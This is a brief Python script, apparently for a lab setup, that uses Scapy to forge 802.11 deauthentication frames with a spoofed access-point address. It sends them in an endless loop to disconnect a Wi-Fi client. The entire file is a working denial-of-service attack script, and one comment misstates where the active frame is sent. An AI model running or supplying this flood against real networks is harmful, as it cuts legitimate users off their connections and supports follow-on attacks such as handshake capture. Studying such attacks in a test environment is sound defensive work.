from scapy.all import *

ap_mac = "02:00:00:00:00:00"

client_mac = "02:00:00:00:01:00"

interface = "wlan2"

# sent to client for disconnection
# 1 is unspsecified reason
#packet = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=1)

# sent to ap to disconnect client
# 3 is code for client disconnect
packet = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=3)


sendp(packet, iface=interface, loop=1, inter=0.1, verbose=1)